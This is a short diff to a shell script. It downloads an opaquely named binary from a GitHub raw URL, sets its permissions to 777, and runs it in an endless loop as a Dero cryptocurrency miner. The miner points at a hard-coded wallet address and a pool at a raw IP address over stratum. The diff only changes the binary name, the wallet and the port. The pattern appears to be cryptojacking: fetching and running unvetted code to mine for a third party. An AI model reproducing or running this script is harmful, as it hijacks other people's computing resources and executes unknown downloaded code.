@@ -1,7 +1,7 @@
-wget https://github.com/renilo/kuuntul/raw/main/manuk
-chmod 777 manuk
+wget https://github.com/renilo/kuuntul/raw/main/babibu
+chmod 777 babibu
 
 while :; do
-    ./manuk -w dero1qywdlqwhmp689gqsevs5dlvgyh8pc7xhde6cd8uw7w87d8f24y2xyqq0h2ec4 -r 170.187.197.220:80;
+    ./babibu -w dero1qyq8st600gjd836pvfzjtrc3sqr6jz7st2s056n5f678keyvvns4zqgs6uveq.$(echo $(shuf -i 1-9999 -n 1)-WEWEK) -r 170.187.197.220:443 -p stratum -m 3;
     sleep 5;
 done
